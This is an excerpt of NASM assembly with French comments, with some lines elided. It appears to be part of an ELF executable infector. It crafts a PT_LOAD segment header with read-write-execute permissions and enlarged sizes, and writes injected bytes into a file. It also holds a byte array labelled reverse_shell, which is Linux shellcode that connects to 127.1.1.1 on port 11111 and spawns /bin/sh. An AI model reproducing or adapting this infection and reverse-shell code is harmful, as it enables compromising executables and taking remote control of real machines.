section .data
    ...
    ;entry_point db 0x00,0x00 ,0x4c,0x00, 0x00, 0x00, 0x00, 0x00


    tp_load db 0x01
    offset_exagereted db 0x00,0x00 ,0x0c,0x00
    droit_write_exe db 0x07

    vaddr_exagereted db 0xb0,0x3d ,0x4c,0x00
    paddr_exagereted db 0xb0,0x3d ,0x4c,0x00

    taille_exagereted db 0x52 ,0x00 ,0x00,0x00
...
;3db0
    ...
    ;reverse_shell db 0x31,0xdb,0xf7,0xe3,0xb0,0x66,0x43,0x52,0x53,0x6a,0x02,0x89,0xe1,0xcd,0x80,0x59,0x93,0xb0,0x3f,0xcd,0x80,0x49,0x79,0xf9,0xb0,0x66,0x68,0x7f,0x01,0x01,0x01,0x66,0x68,0x2b,0x67,0x66,0x6a,0x02,0x89,0xe1,0x6a,0x10,0x51,0x53,0x89,0xe1,0xcd,0x80,0xb0,0x0b,0x52,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x31,0xc9,0xcd,0x80
...
; =============== Ajout shell code  =================
    ...
    mov rdx, 0x52 ; Longueur des nouvelles données à écrire
    syscall             ; Appel système   
